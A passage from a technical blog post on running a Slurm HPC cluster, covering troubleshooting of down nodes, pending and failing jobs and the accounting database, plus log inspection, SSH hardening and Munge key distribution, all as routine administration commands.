class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-100</span><span class="token plain"> /var/log/slurm/slurmctld.log</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="common-issues-and-solutions">Common Issues and Solutions<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#common-issues-and-solutions" class="hash-link" aria-label="Direct link to Common Issues and Solutions" title="Direct link to Common Issues and Solutions" translate="no">​</a></h3>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="issue-node-shows-as-down">Issue: Node Shows as DOWN<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#issue-node-shows-as-down" class="hash-link" aria-label="Direct link to Issue: Node Shows as DOWN" title="Direct link to Issue: Node Shows as DOWN" translate="no">​</a></h4>
<p><strong>Diagnosis:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># OUTPUT: worker-01    down   ...</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show </span><span class="token function" style="color:hsl(221, 87%, 60%)">node</span><span class="token plain"> worker-01</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check "Reason" field</span><br></span></code></pre></div></div>
<p><strong>Solutions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Check if slurmd is running</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> worker-01 </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sudo systemctl status slurmd"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Restart slurmd</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> worker-01 </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sudo systemctl restart slurmd"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Check network connectivity</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ping</span><span class="token plain"> worker-01</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Check logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ssh</span><span class="token plain"> worker-01 </span><span class="token string" style="color:hsl(119, 34%, 47%)">"sudo tail -50 /var/log/slurm/slurmd.log"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 5. Resume the node</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NodeName</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">worker-01 </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">State</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">resume</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="issue-jobs-stuck-in-pending">Issue: Jobs Stuck in Pending<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#issue-jobs-stuck-in-pending" class="hash-link" aria-label="Direct link to Issue: Jobs Stuck in Pending" title="Direct link to Issue: Jobs Stuck in Pending" translate="no">​</a></h4>
<p><strong>Diagnosis:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># See jobs in PD (pending) state</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check why job is pending</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">squeue </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--start</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-j</span><span class="token plain"> JOB_ID</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View detailed job info</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show job JOB_ID</span><br></span></code></pre></div></div>
<p><strong>Common reasons:</strong></p>
<ul>
<li class=""><code>Resources</code>: Not enough resources available</li>
<li class=""><code>Priority</code>: Lower priority than other jobs</li>
<li class=""><code>Dependency</code>: Waiting for another job to complete</li>
<li class=""><code>QOSMaxJobsPerUser</code>: User has too many jobs running</li>
</ul>
<p><strong>Solutions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Check available resources</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sinfo </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"%P %a %l %D %N %C"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. View job requirements</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol show job JOB_ID </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-E</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Partition|NumNodes|MinMemory"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Cancel job if needed</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scancel JOB_ID</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Modify pending job</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">scontrol update </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">JobId</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain">JOB_ID </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">NumNodes</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="issue-jobs-failing-immediately">Issue: Jobs Failing Immediately<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#issue-jobs-failing-immediately" class="hash-link" aria-label="Direct link to Issue: Jobs Failing Immediately" title="Direct link to Issue: Jobs Failing Immediately" translate="no">​</a></h4>
<p><strong>Diagnosis:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check job status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">sacct </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-j</span><span class="token plain"> JOB_ID</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># View job output files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> slurm-JOB_ID.out</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> slurm-JOB_ID.err</span><br></span></code></pre></div></div>
<p><strong>Common causes:</strong></p>
<ul>
<li class="">Script errors (check shebang line)</li>
<li class="">Missing executables</li>
<li class="">Resource limits exceeded</li>
<li class="">Permission issues</li>
</ul>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="issue-accounting-database-not-working">Issue: Accounting Database Not Working<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#issue-accounting-database-not-working" class="hash-link" aria-label="Direct link to Issue: Accounting Database Not Working" title="Direct link to Issue: Accounting Database Not Working" translate="no">​</a></h4>
<p><strong>Diagnosis:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check slurmdbd status</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl status slurmdbd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test database connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-u</span><span class="token plain"> slurm </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> slurm_acct_db </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"SHOW TABLES;"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check slurmdbd logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-50</span><span class="token plain"> /var/log/slurm/slurmdbd.log</span><br></span></code></pre></div></div>
<p><strong>Solutions:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Restart slurmdbd</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart slurmdbd</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Verify database credentials in slurmdbd.conf</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">cat</span><span class="token plain"> /etc/slurm-llnl/slurmdbd.conf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. Check database permissions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> mysql </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-e</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"SHOW GRANTS FOR 'slurm'@'localhost';"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Restart slurmctld to reconnect</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart slurmctld</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="system-logs-with-rsyslog">System Logs with rsyslog<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#system-logs-with-rsyslog" class="hash-link" aria-label="Direct link to System Logs with rsyslog" title="Direct link to System Logs with rsyslog" translate="no">​</a></h3>
<p>Our Ansible setup configures centralized logging:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># On controller (rsyslog server)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> /var/log/syslog</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Filter by hostname</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"worker-01"</span><span class="token plain"> /var/log/syslog</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Filter by service</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"slurmd"</span><span class="token plain"> /var/log/syslog</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check authentication logs</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">tail</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> /var/log/auth.log</span><br></span></code></pre></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="security-best-practices">Security Best Practices<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#security-best-practices" class="hash-link" aria-label="Direct link to Security Best Practices" title="Direct link to Security Best Practices" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="ssh-hardening">SSH Hardening<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#ssh-hardening" class="hash-link" aria-label="Direct link to SSH Hardening" title="Direct link to SSH Hardening" translate="no">​</a></h3>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>warning</div><div class="admonitionContent_BuS1"><p>Secure your login nodes! HPC clusters are attractive targets for attackers.</p></div></div>
<p>For detailed SSH security setup, see our <a class="" href="https://riverxdata.github.io/river-docs/docs/resources/administration/ssh-remote-server">SSH Remote Server documentation</a>.</p>
<p>Key recommendations:</p>
<ol>
<li class=""><strong>Disable Password Authentication</strong>:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/ssh/sshd_config</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">PasswordAuthentication no</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">PubkeyAuthentication </span><span class="token function" style="color:hsl(221, 87%, 60%)">yes</span><br></span></code></pre></div></div>
<ol start="2">
<li class="">
<p><strong>Implement 2FA</strong> with Google Authenticator or similar</p>
</li>
<li class="">
<p><strong>Use SSH Key Pairs</strong>:</p>
</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generate key on your machine</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ssh-keygen </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> ed25519 </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"your_email@example.com"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy to cluster</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">ssh-copy-id user@controller-node</span><br></span></code></pre></div></div>
<ol start="4">
<li class=""><strong>Limit SSH Access</strong>:</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/ssh/sshd_config</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">AllowUsers alice bob charlie</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">AllowGroups cluster_users</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or deny specific users</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">DenyUsers baduser</span><br></span></code></pre></div></div>
<ol start="5">
<li class=""><strong>Change Default Port</strong> (security through obscurity):</li>
</ol>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># /etc/ssh/sshd_config</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Port </span><span class="token number" style="color:hsl(35, 99%, 36%)">2222</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="munge-authentication">Munge Authentication<a href="https://riverxdata.github.io/river-docs/blog/how-to-build-slurm-hpc-part-3#munge-authentication" class="hash-link" aria-label="Direct link to Munge Authentication" title="Direct link to Munge Authentication" translate="no">​</a></h3>
<p>Munge provides authentication between Slurm components:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Verify munge is running</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl status munge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Test munge</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">munge </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-n</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> unmunge</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generate new key (do this on controller, then distribute)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> /usr/sbin/create-munge-key</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Copy key to all nodes (Ansible does this automatically)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">scp</span><span class="token plain"> /etc/munge/munge.key worker-01:/etc/munge/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Restart munge on all nodes</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> systemctl restart munge</span><br></span></code></pre></div></div>
